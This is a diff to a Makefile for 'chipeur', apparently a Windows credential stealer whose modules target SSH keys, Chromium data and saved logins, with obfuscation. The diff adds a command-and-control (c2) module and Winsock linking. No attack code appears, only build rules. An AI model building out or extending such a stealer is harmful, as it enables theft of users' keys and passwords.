@@ -4,7 +4,7 @@ INCLUDE_DIR = include/
 OBJ_DIR = obj/
 
 # add the object file used here
-OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o $(OBJ_DIR)obfuscation.o  $(OBJ_DIR)chromium.o $(OBJ_DIR)path.o $(OBJ_DIR)logins.o $(OBJ_DIR)sqlite3.o $(OBJ_DIR)aes.o
+OBJ_FILES=$(OBJ_DIR)chipeur.o $(OBJ_DIR)find_ssh_key.o $(OBJ_DIR)extract_file.o $(OBJ_DIR)obfuscation.o  $(OBJ_DIR)chromium.o $(OBJ_DIR)path.o $(OBJ_DIR)logins.o $(OBJ_DIR)sqlite3.o $(OBJ_DIR)aes.o $(OBJ_DIR)c2.o
 
 CC=x86_64-w64-mingw32-gcc
 CFLAGS=-g -fPIE -O2 -s -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-dereference \
@@ -12,7 +12,7 @@ CFLAGS=-g -fPIE -O2 -s -Warray-bounds -Wsequence-point -Walloc-zero -Wnull-deref
 
 #not needed for now
 LDFLAGS =# -Wl,--strip-all
-LLIB= -luuid -lole32 -lcrypt32
+LLIB= -luuid -lole32 -lcrypt32 -lws2_32 -lkernel32
 DEBUG=-DDEBUG
 
 .PHONY : all help clean
@@ -24,7 +24,11 @@ all: chipeur.exe
 #$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
 #Create the object files
-$(OBJ_DIR)chipeur.o: $(SRC_DIR)chipeur.c $(INCLUDE_DIR)chipeur.h $(INCLUDE_DIR)find_ssh_key.h
+$(OBJ_DIR)chipeur.o: $(SRC_DIR)chipeur.c $(INCLUDE_DIR)chipeur.h \
+					 $(INCLUDE_DIR)find_ssh_key.h $(INCLUDE_DIR)obfuscation.h \
+					 $(INCLUDE_DIR)c2.h $(INCLUDE_DIR)logins.h $(INCLUDE_DIR)path.h\
+					 $(INCLUDE_DIR)chromium.h
+
 	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
 $(OBJ_DIR)find_ssh_key.o : $(SRC_DIR)find_ssh_key.c $(INCLUDE_DIR)find_ssh_key.h $(INCLUDE_DIR)extract_file.h
@@ -49,6 +53,9 @@ $(OBJ_DIR)sqlite3.o : $(SRC_DIR)sqlite3.c $(INCLUDE_DIR)sqlite3.h
 	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
 $(OBJ_DIR)aes.o : $(SRC_DIR)aes.c $(INCLUDE_DIR)aes.h
+	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
+
+$(OBJ_DIR)c2.o: $(SRC_DIR)c2.c $(INCLUDE_DIR)c2.h $(INCLUDE_DIR)obfuscation.h
 	$(CC) $(DEBUG) $(CFLAGS) -c $< -o $@
 
 #make the binary
